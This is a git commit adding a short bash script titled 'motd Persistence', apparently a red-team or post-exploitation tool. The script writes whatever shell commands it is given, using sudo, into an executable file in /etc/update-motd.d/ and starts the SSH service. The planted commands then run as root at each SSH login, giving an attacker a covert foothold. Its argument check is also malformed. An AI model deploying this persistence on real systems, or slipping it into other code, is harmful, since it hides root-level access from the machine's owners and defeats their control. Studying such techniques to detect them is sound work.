64e940060e2aceadee0297bff9f64dbb6c0a1a96
beelzebub <sachinyadav479@gmail.com>
2021-11-12 15:33:54 +0530

    motd Persistence

---
+++ motd_persistence_tech.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+if [ $1 -z ]
+then
+        echo "$0 <shell commands>"
+        exit 1
+fi
+
+printf "#!/bin/bash\n$1" | sudo tee /etc/update-motd.d/na
+
+sudo chmod +x /etc/update-motd.d/na
+
+sudo /etc/init.d/ssh start
+
+echo "[+] Now try to ssh..."
